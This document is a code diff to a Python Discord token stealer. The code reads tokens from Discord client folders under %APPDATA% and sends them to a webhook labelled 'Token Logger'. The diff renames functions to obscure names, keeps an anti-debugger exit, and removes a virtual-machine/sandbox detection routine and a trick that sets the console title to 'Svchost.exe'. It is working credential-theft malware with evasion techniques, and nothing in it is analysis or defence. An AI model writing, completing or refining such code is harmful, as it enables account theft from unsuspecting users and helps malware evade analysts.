@@ -39,7 +39,7 @@ payload = {
     ]
 }
 requests.post(WEBHOOK_URL, json=payload)
-def anti_debug():
+def eio():
     if ctypes.windll.kernel32.IsDebuggerPresent() != 0:
         sys.exit(0)
 def encrypt_string(input_string):
@@ -48,7 +48,7 @@ def encrypt_string(input_string):
     ciphertext, tag = cipher.encrypt_and_digest(input_string.encode('utf-8'))
     return base64.b64encode(cipher.nonce + tag + ciphertext).decode('utf-8')
 def send_webhook(content, username=WEBHOOK_USERNAME, avatar_url=WEBHOOK_AVATAR, title=None, encrypt=False):
-    anti_debug()
+    eio()
     if not WEBHOOK_URL:
         return
     try:
@@ -123,7 +123,7 @@ def extract_tokens(path, key):
             except Exception as e:
                 print(f"{filename}: {e}")
     return tokens
-def Discord_tokens():
+def rr():
     targets = {
     "Discord": os.path.expandvars("%APPDATA%\\Discord"),
     "Discord Canary": os.path.expandvars("%APPDATA%\\discordcanary"),
@@ -194,12 +194,6 @@ def Discord_tokens():
                 send_webhook(info, title=f"Token Logger - deadconvicss", encrypt=False)
         except Exception as e:
             print(f"{e}")
-def svchost():
-    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
-    SetConsoleTitleW = kernel32.SetConsoleTitleW
-    SetConsoleTitleW.argtypes = [ctypes.c_wchar_p]
-    SetConsoleTitleW.restype = ctypes.c_bool
-    SetConsoleTitleW("Svchost.exe")
 def get_mac():
     try:
         mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,8)][::-1])
@@ -211,28 +205,9 @@ def convert_bytes(size):
         if size < 1024:
             return f"{size:.2f} {x}"
         size /= 1024
-def Vm():
-    import platform, os, uuid, psutil
-    vm_users = ["WDAGUtilityAccount", "sandbox", "user", "test"" JOHN-PC", "Malware", "vm"]
-    vm_mac_prefixes = ["00:05:69", "00:0C:29", "00:1C:14", "00:50:56"]
-    if any(user.lower() in os.getenv("USERNAME", "").lower() for user in vm_users):
-        return True
-    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
-                   for ele in range(0,8*6,8)][::-1])
-    if any(mac.startswith(prefix) for prefix in vm_mac_prefixes):
-        return True
-
-    if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:
-        return True
-    if psutil.cpu_count(logical=False) < 2:
-        return True
-    return False   
 if __name__ == "__main__":
-    if Vm():
-        sys.exit(0)
-    svchost()
-    anti_debug()
-    Discord_tokens()
+    eio()
+    rr()
     while True:
         time.sleep(1)
 
